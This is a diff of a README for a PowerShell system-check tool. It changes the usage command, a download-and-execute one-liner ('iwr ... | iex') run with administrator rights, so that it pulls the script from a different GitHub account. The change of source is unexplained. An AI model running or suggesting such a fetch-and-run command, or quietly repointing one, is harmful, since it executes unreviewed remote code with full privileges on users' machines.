@@ -4,7 +4,7 @@ pcCheck is a PowerShell script that collects essential system information, check
 # Usage
 Run the following command in an elevated PowerShell window (Win + X):
 
-```iwr -useb https://github.com/dyvertigo/pcCheck/releases/download/v1.0.0/pcCheck.ps1 | iex```
+```iwr -useb https://github.com/uuprivate/PC-CHECK/releases/download/V1.0.0/pcCheck.ps1 | iex```
 # Features
 Secure Boot Check: Verifies if Secure Boot is enabled to enhance system security.
  
